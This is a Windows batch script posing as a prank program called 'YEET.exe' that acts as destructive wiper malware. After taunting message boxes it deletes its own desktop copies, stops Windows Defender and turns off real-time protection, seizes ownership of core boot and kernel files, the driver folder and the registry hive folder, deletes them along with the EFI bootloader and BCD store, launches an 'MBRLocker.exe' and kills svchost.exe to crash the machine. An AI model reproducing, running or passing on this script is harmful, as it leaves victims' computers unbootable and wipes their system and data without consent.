@echo off
echo x=msgbox("do you know what you are running?",0+4,"YEET.exe (made by ThePCMaster)")>yt.vbs
wscript yt.vbs
taskkill /f /im YEET.exe
del %userprofile%\Desktop\YEET.* /f
echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
wscript yt.vbs
sc stop WinDefend
powershell set-mppreference -disablerealtimemonitoring $true
cd C:\Windows\System32
mountvol W: /s
takeown /f hal.dll
takeown /f winload.efi
takeown /f winload.exe
takeown /f drivers /r /d y
takeown /f Boot /r /d y
takeown /f ..\Boot /r /d y
takeown /f W:\EFI\Boot\bootx64.efi
takeown /f W:\EFI\Microsoft\Boot\BCD
takeown /f ntoskrnl.exe
takeown /f config /r /d y
takeown /f ci.dll
icacls hal.dll /grant %username%:F
icacls winload.efi /grant %username%:F
icacls winload.exe /grant %username%:F
echo y|cacls drivers /g %username%:F /t
echo y|cacls Boot /g %username%:F /t
echo y|cacls ..\Boot /g %username%:F /t
icacls W:\EFI\Boot\bootx64.efi /grant %username%:F
icacls W:\EFI\Microsoft\Boot\BCD /grant %username%:F
icacls ntoskrnl.exe /grant %username%:F
icacls ci.dll /grant %username%:F
echo y|cacls config /g %username%:F /t
del hal.dll /f
del winload.efi /f
del winload.exe /f
rd drivers /s /q
rd Boot /s /q
rd ..\Boot /s /q
del W:\EFI\Boot\bootx64.efi /f
del W:\EFI\Microsoft\Boot\BCD /f
del ntoskrnl.exe /f
rd config /s /q
del ci.dll /f
cd %userprofile%\Desktop
MBRLocker.exe
timeout /t 15 /nobreak
taskkill /f /im svchost.exe
